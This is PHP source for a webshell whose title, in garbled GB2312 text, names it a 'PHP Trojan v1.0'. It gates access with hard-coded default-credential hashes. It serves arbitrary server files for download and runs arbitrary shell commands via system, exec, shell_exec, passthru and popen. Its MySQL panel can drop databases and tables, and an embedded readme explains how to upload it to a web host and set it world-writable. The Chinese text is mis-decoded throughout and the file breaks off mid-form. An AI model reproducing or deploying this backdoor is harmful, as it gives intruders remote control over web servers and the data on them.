   <?
   header("content-Type:text/html;charset=gb2312");
   $page_time_limit=600;//Éè¶¨½Å±¾ÔËÐÐÊ±¼ä£¬ÓÃÓÚZIPÑ¹Ëõ¼°ÅúÀíÎÄ¼þ´¦Àí£º£©
   $wlczip_max=200;     //wlc·½Ê½´ò°ü×î´ó¶àÉÙMb
   $show_owner=1;       //ÊÇ·ñÏÔÊ¾ËùÓÐÕß
   $show_menu=1;        //ÊÇ·ñÏÔÊ¾ÓÒ¼ü²Ù×÷²Ëµ¥
   $upload_max=25;   //Ò»´Î×î´óÎÄ¼þÉÏ´«¸öÊý
   $pagestartime=microtime();//Ò³ÃæÔËÐÐÊ±¼ä
   @set_time_limit($page_time_limit);
   //ÐÞ¸ÄÕâ²¿·ÖÎªÄã×Ô¼ºµÄ¹ÜÀíÔ±Éí·ÝÑéÖ¤·½Ê½
     if(getenv(HTTP_CLIENT_IP))  {$REMOTE_ADDR = getenv(HTTP_CLIENT_IP);}
     elseif(getenv(HTTP_X_FORWARDED_FOR)) {$REMOTE_ADDR = getenv(HTTP_X_FORWARDED_FOR);}
     else {$REMOTE_ADDR = getenv("REMOTE_ADDR");}
     if($REMOTE_ADDR!=""&&$REMOTE_ADDR!="")//ÔÊÐíÖ±½Ó·ÃÎÊµÄIP
        { if(!isset($PHP_AUTH_USER))
       { Header("WWW-Authenticate:Basic realm=\"$REMOTE_ADDR ¹ÜÀíÔ±µÇÂ½\"");
         Header("HTTP/1.0 401 Unauthorized");
         echo "¶Ô²»Æð,ÄúÃ»ÓÐÈ¨ÏÞ\n";
         exit();}
       else{ if((md5($PHP_AUTH_USER)!="21232f297a57a5a743894a0e4a801fc3") || (md5($PHP_AUTH_PW)!="e10adc3949ba59abbe56e057f20f883e"))
           { Header("WWW-Authenticate:Basic realm=\"ÓÃ»§Ãû»òÕßÃÜÂë´íÎó\"");
               Header("HTTP/1.0 401 Unauthorized");
               exit();}
       }
   }
   //¹ÜÀíÔ±Éí·ÝÑéÖ¤£¬ÏÂÃæÎª¹ÜÀíÔ±¿´µ½µÄÄÚÈÝ

   /////////////////////////////////////////////////////////////////////////////////////////////////////
   if( $tools == "mysql" && $action == "logon_submit" )
   {
   setcookie("mysql_web_admin_zoom", $zoom );
   setcookie("mysql_web_admin_username", $username );
   setcookie("mysql_web_admin_password", $password );
   echo "<html><head><META HTTP-EQUIV=Refresh CONTENT='0; URL=$PHP_SELF?tools=mysql&action=listDBs'>";
   echo "</head><body>µÈ´ýÏÔÊ¾Êý¾Ý¡£¡£¡£¡£</html>";
   }
   elseif($tools == "mysql") {
   while( list($var, $value) = each($HTTP_COOKIE_VARS) ) {
   if( $var == "mysql_web_admin_zoom" ) $zoom = $value;
   if( $var == "mysql_web_admin_username" ) $USERNAME = $value;
   if( $var == "mysql_web_admin_password" ) $PASSWORD = $value;
   }
   }
   if( $tools == "mysql" && $action == "logout" )
   {
   setcookie("mysql_web_admin_zoom", "NULL" );
   setcookie("mysql_web_admin_username", "NULL" );
   setcookie("mysql_web_admin_password", "NULL" );
   }
   ////////////////////////////////////////////////////////////////////////////////////////////////////////
   if ($downfile) { //ÏÂÔØÎÄ¼þ£¬¸ù¾Ý²¿·Öºó×ºÃûµÄ²»Í¬ÓÃ²»Í¬·½Ê½´ò¿ª
       if (!@is_file($downfile)) {echo"ÄãÒªÏÂµÄÎÄ¼þ²»´æÔÚ";exit;}
       $filename = basename($downfile);
       $filetype=strtolower(substr($filename,strrpos($filename,".")));
       //View picture
       if ($filetype=='.gif') {
           header('Content-type: image/gif');
           @readfile($downfile);
           exit;
       }
       elseif ($filetype=='.jpg' or $extension[1]=='.jpeg') {
           header('Content-type: image/jpeg');
           @readfile($downfile);
           exit;
       }
       elseif ($filetype=='.png') {
           header('Content-type: image/png');
           @readfile($downfile);
           exit;}
       elseif ($filetype=='.swf') {
           header('Content-type: application/x-shockwave-flash');
           @readfile($downfile);
           exit;}
       elseif ($filetype=='.mp3') {
           header('Content-type: audio/mpeg');
           @readfile($downfile);
           exit;}
       elseif ($filetype=='.wma') {
           header('Content-type: audio/x-ms-wma');
           @readfile($downfile);
           exit;}
       elseif ($filetype=='.ram' or $filetype=='.rm') {
           header('Content-type: audio/x-pn-realaudio');
           @readfile($downfile);
           exit;
       }
       // Download
       if (preg_match('@Opera(/| )([0-9].[0-9]{1,2})@', $HTTP_USER_AGENT, $log_version)) {
           $USR_BROWSER_AGENT='OPERA';
       } elseif (preg_match('@MSIE ([0-9].[0-9]{1,2})@', $HTTP_USER_AGENT, $log_version)) {
           $USR_BROWSER_AGENT='IE';
       }
       else $USR_BROWSER_AGENT='OTHER';
       $mime_type=($USR_BROWSER_AGENT=='IE'||$USR_BROWSER_AGENT=='OPERA')?'application/octetstream':'application/octet-stream';
       header('Content-Type: ' . $mime_type);
       header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT');
       // lem9 & loic1: IE need specific headers
       if ($USR_BROWSER_AGENT=='IE') {
           header('Content-Disposition: inline; filename="' . $filename . '"');
           header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
           header('Pragma: public');
       } else {
           header('Content-Disposition: attachment; filename="' . $filename . '"');
           header('Pragma: no-cache');
       }
       @readfile($downfile);
       exit;
   }
   else{
   if($action=="cut"||$action=="copy"){
       if(!empty($file)) {
           $parsefile=$file[0];
           for($i=1;$file[$i];$i++) $parsefile.="|".$file[$i];
           $act=$action;
           $olddir=$dir;
           setcookie("parsefile",$parsefile,0);
           setcookie("act",$act,0);
           setcookie("olddir",$olddir,0);
           session_start();
           session_register("parsefile");
           session_register("act");
           session_register("olddir");
       }
   }
   if($action=="parse"){
       if(!empty($HTTP_COOKIE_VARS['act'])&&!empty($HTTP_COOKIE_VARS['parsefile'])&&!empty($HTTP_COOKIE_VARS['olddir']))
       {   //´ÓCOOKIEÖÐ¶Á³ö¼ôÇÐ°æÊý¾Ý
           $act=$HTTP_COOKIE_VARS['act'];
           $olddir=$HTTP_COOKIE_VARS['olddir'];
           $file=explode("|",$HTTP_COOKIE_VARS['parsefile']);
       }
       else{
           session_start();
           session_register("parsefile");
           session_register("act");
           session_register("olddir");
           if(!empty($_SESSION['act'])&&!empty($_SESSION['parsefile'])&&!empty($_SESSION['olddir']))
           {   //´ÓSESSIONÖÐ¶Á³ö¼ôÇÐ°æÊý¾Ý
               $act=$_SESSION['act'];
               $olddir=$_SESSION['olddir'];
               $file=explode("|",$_SESSION['parsefile']);
           }
       }
   }

   ?>
   <html>
   <head>
   <title>ºÚ¿ÍÖ®¼ÒPHPÄ¾Âí v1.0</title>
   <meta http-equiv=content-type content=text/html;charset=gb2312>
   <style type=text/css>
   code{font-size:9pt;font-family: ËÎÌå;line-height:100%;}
   a:link {color: green;TEXT-DECORATION: none}
   a:visited {color: green;TEXT-DECORATION: none}
   a:hover {color: green;TEXT-DECORATION: underline}
   h3 { color: green}
   body,table,tr,p { font: 12px;color: darkgreen;}
   td { font: 12px;color: #000000;}
   table,tr,td { border: 0px;}
   .tbldata tr.selected td {background-color:#f3c6cb;}
   textarea {border:solid 1; font-family:ËÎÌå,verdana;font-size:9pt;color:#3F0B00;background-color:#FFEACC}
   .t1 { background: #FF7FBF}
   .t11 { background: #FFA6C4}
   .t12 { background: #FEFEFF}
   .t2 { background: #FFA6C4;border: #FBE5FA 1px solid}
   .t21 { background: #D9F5FF}
   .t22 { background: #FFA6C4;height:20px;vertical-align: middle}
   input {font-size:9pt;border: 1px solid #3d9832;color:#FF7FBF;background:#FFE6FD}
   .chcekbox {font-size:16pt;border: 0px solid #3d9832;color:darkgreen}
   .title{FONT-SIZE: 9pt; FONT-FAMILY: ËÎÌå;COLOR: #FFFFFF}
   BODY {margin: 10px 10px;background: #D9F5FF;FONT-SIZE: 9pt; FONT-FAMILY: ËÎÌåCOLOR: #CCAAAA;
        scrollbar-face-color: #9CB54A; scrollbar-shadow-color: #E3F7A2;
        scrollbar-highlight-color: #E3F7A2; scrollbar-3dlight-color: #E3F7A2;
        scrollbar-darkshadow-color: #E3F7A2; scrollbar-track-color: #E3F7A2;
        scrollbar-arrow-color: #7B932C;
   }
   .op {background-color: #8000FF; color: rgb(255,255,255)}
   </style>
   </head>
   <body topmargin="0" leftmargin="0" <?php if($show_menu && !$n && !$tools) echo 'oncontextmenu="window.event.returnValue=false"';?>>
   <center>
   <?php
   }
   if($tools==readme) { //²Ù×÷ËµÃ÷
       echo"<table class=t1 width=750 cellspacing=1 cellpadding=1><tr><td class=t11><center>ºÚ¿ÍÖ®¼ÒPHPÄ¾Âí v1.0</center></td></tr> <tr><td class=t12><textarea cols=121 rows=22 readonly name=textarea> ";
             echo'################################# ºÚ¿ÍÖ®¼ÒPHPÄ¾Âí¼ò½é ######################################
   ¡öÍøÒ³³ÌÐòÃû³Æ£ººÚ¿ÍÖ®¼ÒPHPÄ¾Âí v1.0
   ¡ö×÷Õß£º°¢½Ü(jack3240782@163.com)
   ¡öÊ±¼ä£º2005Äê2ÔÂ1ÈÕ
   ¡öÎÄ¼þ¹¦ÄÜ£ºÊµÏÖ¶ÔÍøÕ¾Ç¿´óµÄ×ÛºÏ¹ÜÀí£¨¶àÖÖ¸ñÊ½ÔÚÏßÑ¹ËõºÍ½âÑ¹Ëõ£¬¶ÔÎÄ¼þ»ù±¾²Ù×÷£¬
                 mysqlÊý¾Ý¿â±¸·Ý»¹Ô£¬phpshell¹¤¾ß£¬ ÑÕÉ«Ê°È¡Æ÷£¬phpÌ½Õë£¬ÃÜÂë/±àÂë¹¤¾ßµÈµÈµÈ£©

   Ò»¡¢°²×°»·¾³£º¿Õ¼ä²Ù×÷ÏµÍ³ÎªFreeBSD,Unix,Linux,SunOSµÈ£¨×îºÃ¹Ø±Õ°²È«Ä£Ê½£©£¬
                ¡¾ºÚ¿ÍÖ®¼ÒPHPÄ¾Âí¡¿ÔÚÒÔÉÏÏµÍ³²âÊÔÔËÐÐÕý³££¬
                 ÔÚÆäËû²Ù×÷ÏµÍ³¿ÉÄÜÓÐ²»Óö¼ûµÄ´íÎó³öÏÖ¡£

   ¶þ¡¢°²×°·½·¨£º½«´Ë³ÌÐòwebadmin.phpÉÏ´«ÖÁÄãµÄÍøÕ¾¿Õ¼ä£¨¿Õ¼ä±ØÐëÖ§³Öphp£©£¬
                 ÉèÖÃwebadmin.phpµÄÊôÐÔÎª777,ÆäËùÔÚÎÄ¼þ¼ÐµÄÊôÐÔÒ²ÉèÎª777¡£

   Èý¡¢ÔËÐÐ·½Ê½£ºÍ¨¹ýIEä¯ÀÀÆ÷ÒÔhttpµÄ·½Ê½´ò¿ªwebadmin.phpµÄURLµØÖ·£¬È»ºóÊäÈëµÚÒ»
                 ´ÎÊ¹ÓÃµÄÄ¬ÈÏÃÜÂë¼´¿É´ò¿ª¹ÜÀíÒ³Ãæ¡££¨½øÈëºóÎªÁË¿Õ¼ä°²È«Îñ±Ø¸ÄÃÜÂë£©¡£

   ËÄ¡¢¹ÜÀí²Ù×÷£º
                 1.ËùÓÐ¹¦ÄÜ£º[1].ÎÄ¼þ»ù±¾²Ù×÷¹¦ÄÜ£ºÅúÁ¿É¾³ý¡¢ÅúÁ¿¸´ÖÆ¡¢ÅúÁ¿¼ôÇÐ¡¢ÅúÁ¿Õ³Ìù¡¢
                                                   ÅúÁ¿¸ü¸ÄÊôÐÔ£¬µ¥ÎÄ¼þ±à¼£¬½¨Á¢ÐÂÎÄ¼þ£¬
                                                   ½¨Á¢ÐÂÎÄ¼þ¼Ð£¬¸ü¸ÄÎÄ¼þ»òÎÄ¼þ¼ÐÃû×ÖµÈ¡£
                             [2].ÎÄ¼þÌØÉ«²Ù×÷¹¦ÄÜ£º*ÅúÁ¿zipÑ¹Ëõ£¬*zipÎÄ¼þä¯ÀÀ£¬*ÅúÁ¿tar´ò°ü£¬
                                                   *ÅúÁ¿tar.gz´ò°üÑ¹Ëõ£¬ÅúÁ¿wlc´ò°ü£¬
                                                   ÒÔ¼°Ïà¶ÔÓ¦µÄ½âÑ¹ºÍ½â°ü·½Ê½¡£
                                                   ´Ó±¾µØÉÏ´«ÎÄ¼þ£¨¿É×Ô¶¨ÒåÒ»´ÎÉÏ´«ÎÄ¼þ¸öÊý£©£¬
                                                   *´ÓurlÉÏ´«ÎÄ¼þ£¨¿É×Ô¶¨ÒåÒ»´ÎÉÏ´«ÎÄ¼þ¸öÊý£©¡£
                             [3].ÆäËûÌØÉ«¹¦ÄÜ£º    phpshell¹¤¾ß£¬ÑÕÉ«Ê°È¡Æ÷£¬phpÌ½Õë£¬
                                                   ÃÜÂë/±àÂë¹¤¾ß£¬mysql±¸·ÝÓë»¹Ô¹¤¾ß¡£

   ÔðÈÎºÍ°æÈ¨ÉùÃ÷£º
   1.±¾Èí¼þ¶Ô²¿·Ö·þÎñÆ÷ÓÐÒ»¶¨µÄÎ£ÏÕÐÔ£¬²»µÃÓÃ±¾Èí¼þ¹¦ÄÜÍµÇÔ»òÕßÐÞ¸ÄËûÈË×ÊÁÏ£¬Ôì³Éºó¹ûÒ»ÇÐÔðÈÎ×Ô¸º£¬Óë±¾Èí¼þ¿ª·¢ÈËÔ±ÎÞ¹Ø¡£
   2.´íÎóµÄ²Ù×÷±¾Èí¼þ£¬¿ÉÄÜµ¼ÖÂÄãµÄ×ÊÁÏ¶ªÊ§£¬Çë²Ù×÷Ö®Ç°È·ÈÏÎÞÎó£¬±ÜÃâ²»±ØÒªµÄËðÊ§¡£
   3.±¾Èí¼þ´úÂëÍêÈ«¹«¿ª£¬¿ÉÃâ·Ñ¹©¸öÈËÑ§Ï°Ê¹ÓÃ£¬ÈçÐëÉÌÒµÊ¹ÓÃÇëÓë±¾ÈËÁªÏµ¡£
   4.ÔÚÊ¹ÓÃµÄ¹ý³ÌÖÐÇë×ðÖØ×÷ÀÍ¶¯³É¹û£¬Îñ±Ø±£Áô°æÈ¨ÐÅÏ¢¡£
   ';

       echo"</textarea> </td></tr></form></table>";
   }
   elseif($tools==phpshell) { //PHPSHELLÃüÐÐÁî
   ?>
   <table class=t1 width=750 cellspacing=1 cellpadding=1> <form name='' action='?tools=phpshell' method=post><tr><td class=t11>
   º¯Êý:<select name="seletefunc" class="input">
                   <option value="system" <?=($seletefunc=="system")?"selected":"";?>>system</option>
                   <option value="exec" <?=($seletefunc=="exec")?"selected":"";?>>exec</option>
                   <option value="shell_exec" <?=($seletefunc=="shell_exec")?"selected":"";?>>shell_exec</option>
                   <option value="passthru" <?=($seletefunc=="passthru")?"selected":"";?>>passthru</option>
                   <option value="popen" <?=($seletefunc=="popen")?"selected":"";?>>popen</option>
               </select>
   <?php isset($shellcmd)?$shellcmd=stripslashes($shellcmd):""?>
   ÃüÁî: <input name="shellcmd" type="text" class="style1" value="<?=isset($shellcmd)?$shellcmd:""?>" size="50"> <input type=submit value=ÔËÐÐ name=submit> phpshell¹¤¾ß¡¡¡¡<a href=http://publib16.boulder.ibm.com/doc_link/zh_CN/a_doc_lib/cmds/aixcmds2/aixcmds202.htm#IDX1_41 target=_blank>ÃüÁî²Î¿¼</a></td></tr> <tr><td class=t12> <textarea cols=121 rows=22 readonly name=textarea>
   <?
   if (!empty($shellcmd)) {
       if ($seletefunc == "popen") {
           $pp = popen($shellcmd, 'r');
           $out = fread($pp, 2096);
           pclose($pp);
       } elseif("system" == $seletefunc) system($shellcmd);
          else{
           $out = ($seletefunc == "exec")?exec($shellcmd):(($seletefunc == "shell_exec")?shell_exec($shellcmd):(($seletefunc == "passthru")?passthru($shellcmd):system($shellcmd)));
       }
   }
   preg_match_all( "|(.)|U", $out, $out_temp);
   $out = str_replace($out_temp[0], '',$out);
   //$out = str_replace('_', '',$out);
   echo "ÔËÐÐ½á¹û£º\n".$out;

               ?></textarea> <p>
               <span class="stylebtext2"><?echo get_cfg_var("safe_mode")?"ÌáÊ¾:°²È«Ä£Ê½ÏÂ¿ÉÄÜÎÞ·¨Ö´ÐÐ":"";?></span><p>
    </td></tr></form></table>
   <?
   }
   elseif($tools==changecode) { //ÃÜÂë/±àÂë¹¤¾ß
   if($passwd){
       $enpw       = crypt($passwd,$salt);
       $shadow     = crypt($passwd,"$1$".$salt);
       $BLOWFISH   = crypt($passwd,"$2$".$salt);
       $md5hash    = md5($passwd);
       $enbase64   = base64_encode($passwd);
       $debase64   = base64_decode($passwd);
       $debase64   = base64_decode($passwd);
       $ChineseName = $passwd;
       $EncoenStr  = urlencode($ChineseName);
       $EncodeStr  = urldecode($ChineseName);
       $rawurlen   = rawurlencode($ChineseName);
       $rawurlde   = rawurldecode($ChineseName);
       }
          echo"<table class=t1 width=750 cellspacing=1 cellpadding=1>";
          echo"<tr><td class=t11>ÃÜÂë/±àÂë¹¤¾ß</tr>";
   echo '
         <tr bgcolor=#FFEFBF>
         <td width="15%" height="2" align="center">ÊäÈë£º</td>
         <td height="2" colspan="2">
   <form method="get" action="">
   <input type="hidden" name="tools" value="changecode">
   <input type="text" name="passwd" size="50" value=""> <input type="submit" value="submit"> </td></form>
       </tr>
       <tr bgcolor="#FFEFBF">
         <td height="2" align="center">CRYPT_STD_DES</td>
         <td width="31%" height="2"> ';echo "$enpw";echo '</td>
         <td width="54%"> salt
           <input name="salt" type="text" id="salt" value="salt"></td>
       </tr>
       <tr bgcolor="#FFEFBF">
         <td height="20" align="center">CRYPT_MD5</td>
         <td height="20">'; echo "$shadow";echo '</td>
         <td height="20">*(Unix like Shadow)</td>
       </tr>
       <tr bgcolor="#FFEFBF">
         <td height="2" align="center">CRYPT_BLOWFISH</td>
         <td height="2">';echo "$BLOWFISH";echo '</td>
         <td height="2"> </td>
       </tr>
       <tr bgcolor="#FFEFBF">
         <td height="2" align="center">MD5</td>
         <td height="2" colspan="2"> '; echo "$md5hash";echo ' </td>
       </tr>
       <tr bgcolor="#FFEFBF">
         <td height="2" align="center">BASE64</td>
         <td height="2">±àÂë£º';echo "$enbase64</td>
         <td height=2>½âÂë£º$debase64</td>
       </tr>";
       echo '
       <tr bgcolor="#FFEFBF">
         <td height="2" align="center">URL </td>
         <td height="2">±àÂë£º';echo "$EncoenStr</td>
         <td height=2>½âÂë£º$EncodeStr</td>
       </tr>";echo '
       <tr>
         <td colspan="3" bgcolor="#333399" height="2"> <div align="center">
           </div></td>
       </tr>';
     echo"</td></tr></table>";
   }
   elseif($tools==À©Õ¹tool) { //À©Õ¹tool
          echo"<table class=\"t1\" width=\"750\" cellspacing=\"1\" cellpadding=\"1\">";
          echo"<tr><td class=\"t11\">À©Õ¹tool</tr><tr><td class=\"t12\">";

          echo"</td></tr></table>";
   }
   elseif($tools=="showh") { //ÏÔÊ¾³ÌÐò´úÂëÄÚÈÝ
          echo"<table class=\"t1\" width=\"750\" cellspacing=\"1\" cellpadding=\"1\">";
          echo"<tr><td class=\"t11\">$file[0]µÄÄÚÈÝÈçÏÂ</tr><tr><td class=\"t12\">";
          if (!show_highlight("$dir/$file[0]")) {
               $error = buildphrase('"<b>' . htmlentities("$dir/$file") . '</b>"', "¸ÃÎÄ¼þ²»ÄÜ±»ÏÔÊ¾");
           } else {exit;}
          echo"</td></tr></table>";
   }
   elseif($tools==mysql) { //mysqladmin
          echo"<table class=\"t1\" width=\"750\" cellspacing=\"1\" cellpadding=\"1\">";
          echo"<tr><td class=\"t11\">mysqlÊý¾Ý¿â¹ÜÀí</tr><tr><td class=\"t12\">";
   ?>
   <?
   function logon() {
   global $PHP_SELF;
   echo "<html><head><title>Êý¾Ý¿â¹ÜÀí</title></head><body>";
   echo "<table width=100% height=100%><tr><td><center>\n";
   echo "<table cellpadding=2><tr><td bgcolor=#a4a260><center>\n";
   echo "<table cellpadding=20><tr><td bgcolor=#ffffff><center>\n";
   echo "<h1>Êý¾Ý¿â¹ÜÀíµÇÂ¼½çÃæ</h1>\n";
   echo "<form action='$PHP_SELF' method=post>\n";
   echo "<input type=hidden name=tools value=mysql>\n";
   echo "<input type=hidden name=action value=logon_submit>\n";
   echo "<table cellpadding=5 cellspacing=1>\n";
   echo "<tr><td>Ö÷»úip </td><td><input type=text name=zoom></td></tr>";
   echo "<tr><td>ÕËºÅ </td><td><input type=text name=username></td></tr>";
   echo "<tr><td>ÃÜÂë </td><td><input type=password name=password></td></tr> ";
   echo "</table><p>";
   echo "<input type=submit value=È·ÈÏ>¡¡¡¡<input type=reset value=Çå³ý><br>";
   echo "</form>";
   echo "</center></td></tr></table>";
   echo "</center></td></tr></table>";
   echo "</center></td></tr></table>";
   echo "</body></html> ";
   }
   function echoQueryResult() {
   global $queryStr, $errMsg;
   if( $errMsg == "" ) $errMsg = "Íê³É";
   if( $queryStr != "" ) {
   echo "<table cellpadding=5>\n";
   echo "<tr><td>Query</td><td>$queryStr</td>;</tr>\n";
   echo "<tr><td>Result</td><td>$errMsg</td></tr>\n";
   echo "</table><p>\n";
   }
   }
   function listDatabases() {
   global $mysqlHandle, $PHP_SELF;
   echo "Ä¿Ç°ÒÑ´æÔÚµÄÊý¾Ý¿âÁÐ±í<br>\n";
   ?>
   <font size=2>
   <a href=" <? echo "$PHP_SELF"; ?>?tools=mysql&action=listDBs">Êý¾Ý¿âÁÐ±í</a> |
   <?
   if( $tablename != "" )
   echo "<a href='$PHP_SELF?tools=mysql&action=listTables&dbname=$dbname&tablename=$tablename'>ÏÔÊ¾Êý¾Ý¿â±íÁÐ±í</a> | ";
   ?><a href=" <? echo "$PHP_SELF"; ?>?tools=mysql&action=logout">ÍË³ö</a></font>
   <?
   echo "<form action='$PHP_SELF'><input type=hidden name=action value=createDB>
   <input type=hidden name=tools value=mysql><input type=text name=dbname>¡¡<input type=submit value='ÐÂ½¨Êý¾Ý¿â'></form><hr>
   <table cellspacing=1 cellpadding=5>\n";
   $pDB = mysql_list_dbs($mysqlHandle);
   $num = mysql_num_rows($pDB);
   for( $i = 0; $i < $num; $i++ ) {
   $dbname = mysql_dbname( $pDB, $i );
   echo "<tr><td>$dbname</td>";
   echo "<td><a href=$PHP_SELF?tools=mysql&action=listTables&dbname=$dbname>Êý¾Ý±í</a></td>";
   echo "<td><a href='$PHP_SELF?tools=mysql&action=dropDB&dbname=$dbname'";
   echo "onClick=\"return confirm('Drop Database \'$dbname\'?')\">É¾³ý</a></td>";
   echo "</tr>\n";
   }
   echo "</table>\n";
   }
   function createDatabase(){
   global $mysqlHandle, $dbname, $PHP_SELF;
   mysql_create_db($dbname, $mysqlHandle );
   listDatabases();}
   function dropDatabase() {
   global $mysqlHandle, $dbname, $PHP_SELF;
   mysql_drop_db( $dbname, $mysqlHandle );
   listDatabases();}
   function listTables() {
   global $mysqlHandle, $dbname, $PHP_SELF;
   echo "<h1>Êý¾Ý¿â±íÁÐ±í</h1>\n";
   echo "<p class=location>$dbname</p>\n";
   echoQueryResult();
   echo "<form action='$PHP_SELF'><input type=hidden name=tools value=mysql>\n";
   echo "<input type=hidden name=action value=createTable>\n";
   echo "<input type=hidden name=dbname value=$dbname>\n";
   echo "<input type=text name=tablename>\n";
   echo "<input type=submit value='ÐÂ½¨Êý¾Ý¿â±í'>\n";
   echo "</form>\n";
   echo "<form action='$PHP_SELF'><input type=hidden name=tools value=mysql>\n";
   echo "<input type=hidden name=action value=query>\n";
   echo "<input type=hidden name=dbname value=$dbname>\n";
   echo "<input type=text size=40 name=queryStr>\n";
   echo "<input type=submit value='°´SQLÓï¾ä²éÑ¯'>\n";
   echo "</form>\n";
   echo "<p><hr>\n";
   $pTable = mysql_list_tables( $dbname );
   if( $pTable == 0 ) {
   $msg = mysql_error();
   echo "<h3>Error : $msg</h3><p>\n";
   return; }
   $num = mysql_num_rows( $pTable );
   echo "<table cellspacing=1 cellpadding=5>\n";
   for( $i = 0; $i < $num; $i++ ) {
   $tablename = mysql_tablename( $pTable, $i );
   echo "<tr><td>$tablename</td><td>";
   echo "<a href='$PHP_SELF?tools=mysql&action=viewSchema&dbname=$dbname&tablename=$tablename'>½á¹¹</a>\n";
   echo "</td><td>";
   echo "<a href='$PHP_SELF?tools=mysql&action=viewData&dbname=$dbname&tablename=$tablename'>¼ÇÂ¼</a>\n";
   echo "</td><td> ";
   echo "<a href='$PHP_SELF?tools=mysql&action=dropTable&dbname=$dbname&tablename=$tablename' ";
   echo "onClick=\"return confirm('Drop Database \'$dbname\'?')\">É¾³ý</a>\n";
   echo "</td></tr>";
   }
   echo "</table>";
   }
   function createTable() {
   global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $queryStr, $errMsg;
   $queryStr = "CREATE TABLE ".$tablename;
   mysql_select_db( $dbname, $mysqlHandle );
   mysql_query( $queryStr, $mysqlHandle );
   $errMsg = mysql_error();
   listTables();
   }
   function dropTable() {
   global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $queryStr, $errMsg;
   $queryStr = "DROP TABLE $tablename";
   mysql_select_db( $dbname, $mysqlHandle );
   mysql_query( $queryStr, $mysqlHandle );
   $errMsg = mysql_error();
   listTables();
   }
   function viewSchema() {
   global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $queryStr, $errMsg;
   echo "<h1>±í½á¹¹</h1>\n";
   echo "<p class=location>$dbname > $tablename</p>\n";
   echoQueryResult();
   echo "<a href='$PHP_SELF?tools=mysql&action=addField&dbname=$dbname&tablename=$tablename'>ËùÓÐ×Ö¶Î</a> | \n";
   echo "<a href='$PHP_SELF?tools=mysql&action=viewData&dbname=$dbname&tablename=$tablename'>ÏÔÊ¾Êý¾Ý</a>\n";
   echo "<hr>\n";
   $pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
   $num = mysql_num_rows( $pResult );
   echo "<table cellspacing=1 cellpadding=5>\n";
   echo "<tr>\n";
   echo "<th>×Ö¶ÎÃû³Æ</th>\n";
   echo "<th>×Ö¶ÎÀàÐÍ</th>\n";
   echo "<th>¿É¿Õ</th>\n";
   echo "<th>Ö÷¼ü</th>\n";
   echo "<th>È±Ê¡Öµ</th>\n";
   echo "<th>±¸×¢</th>\n";
   echo "<th colspan=2>²Ù×÷</th>\n";
   echo "</tr>\n";
   for( $i = 0; $i < $num; $i++ ) {
   $field = mysql_fetch_array( $pResult );
   echo "<tr>\n";
   echo "<td>".$field[ "Field"]. "</td>\n";
   echo "<td>".$field[ "Type"]. "</td>\n";
   echo "<td>".$field[ "Null"]. "</td>\n";
   echo "<td>".$field[ "Key"]. "</td>\n";
   echo "<td>".$field[ "Default"]. "</td>\n";
   echo "<td>".$field[ "Extra"]. "</td>\n";
   $fieldname = $field[ "Field"];
   echo "<td><a href='$PHP_SELF?tools=mysql&action=editField&dbname=$dbname&tablename=$tablename&fieldname=$fieldname'>±à¼</a></td>\n";
   echo "<td><a href='$PHP_SELF?tools=mysql&action=dropField&dbname=$dbname&tablename=$tablename&fieldname=$fieldname' ";
   echo "onClick=\"return confirm('Drop Field \'$fieldname\'?')\">É¾³ý</a></td> ";
   echo "</tr>\n";
   }
   echo "</table>\n";
   }
   function manageField( $cmd ) {
   global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF;
   if( $cmd == "add" )
   echo "<h1>Ìí¼Ó×Ö¶Î</h1>\n";
   else if( $cmd == "edit" ) {
   echo "<h1>±à¼×Ö¶Î</h1>\n";
   $pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
   $num = mysql_num_rows( $pResult );
   for( $i = 0; $i < $num; $i++ ) {
   $field = mysql_fetch_array( $pResult );
   if( $field[ "Field"] == $fieldname ) {
   $fieldtype = $field[ "Type"];
   $fieldkey = $field[ "Key"];
   $fieldextra = $field[ "Extra"];
   $fieldnull = $field[ "Null"];
   $fielddefault = $field[ "Default"];
   break; } }
   $type = strtok( $fieldtype, " (,)\n" );
   if( strpos( $fieldtype, "(" ) ) {
   $M = strtok( " (,)\n" );
   if( strpos( $fieldtype, "," ) )
   $D = strtok( " (,)\n" );
   } }
   echo "<p class=location>$dbname > $tablename</p>\n";
   echo "<form action=$PHP_SELF><input type=hidden name=tools value=mysql>\n";
   if( $cmd == "add" )
   echo "<input type=hidden name=action value=addField_submit>\n";
   else if( $cmd == "edit" ) {
   echo "<input type=hidden name=action value=editField_submit>\n";
   echo "<input type=hidden name=old_name value=$fieldname>\n";
   }
   echo "<input type=hidden name=dbname value=$dbname>\n";
   echo "<input type=hidden name=tablename value=$tablename>\n";
   echo "<h3>×Ö¶ÎÃû³Æ</h3>\n";
   echo "<input type=text name=name value=$fieldname><p>\n";
   ?>
   <h3>ËµÃ÷</h3>
   <font size=2>
   * `M' ±íÊ¾×î´óÏÔÊ¾³¤¶È.<br>
   * `D' ÓÃÓÚ¸¡µãÊý×ÖÐÍ£¬±íÊ¾Ð¡ÊýµãºóÃæµÄÐ¡ÊýÎ»Êý.<br>
   </font><table><tr>
   <th>ÀàÐÍ</th><th> M </th><th> D </th><th>ÎÞ·ûºÅ</th><th>Ê¹ÓÃÁãÌî³ä</th><th>¶þ½øÖÆ¿â</th>
   </tr><tr>
   <td><input type=radio name=type value="TINYINT"
   <? if( $type == "tinyint" ) echo "checked";?>>TINYINT (-128 ~ 127)</td>
   <td align=center>O</td>
   <td> </td>
   <td align=center>O</td>
   <td align=center>O</td>
   <td> </td> </tr><tr>
   <td><input type=radio name=type value="SMALLINT"
   <? if( $type == "smallint" ) echo "checked";?>>SMALLINT (-32768 ~ 32767)</td>
   <td align=center>O</td>
   <td> </td>
   <td align=center>O</td>
   <td align=center>O</td>
   <td> </td> </tr><tr>
   <td><input type=radio name=type value="MEDIUMINT"
   <? if( $type == "mediumint" ) echo "checked";?>>MEDIUMINT (-8388608 ~ 8388607)</td>
   <td align=center>O</td>
   <td> </td>
   <td align=center>O</td>
   <td align=center>O</td>
   <td> </td></tr><tr>
   <td><input type=radio name=type value="INT"
   <? if( $type == "int" ) echo "checked";?>>INT (-2147483648 ~ 2147483647)</td>
   <td align=center>O</td>
